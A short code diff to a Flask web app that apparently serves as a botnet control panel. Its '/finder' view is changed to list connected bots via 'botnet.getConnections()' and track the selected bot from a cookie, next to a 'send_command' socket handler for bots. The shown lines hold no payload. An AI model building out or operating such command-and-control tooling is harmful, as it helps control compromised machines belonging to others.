@@ -114,7 +114,11 @@ def index():
 @app.route('/finder')
 @requires_auth
 def finder():
-    return render_template('finder.html', async_mode=socketio.async_mode)
+    connected = ''
+    if 'bot' in request.cookies:
+        connected = request.cookies.get('bot')
+    return render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
+                                         connected=connected)
 
 
 @socketio.on('send_command', namespace='/bot')
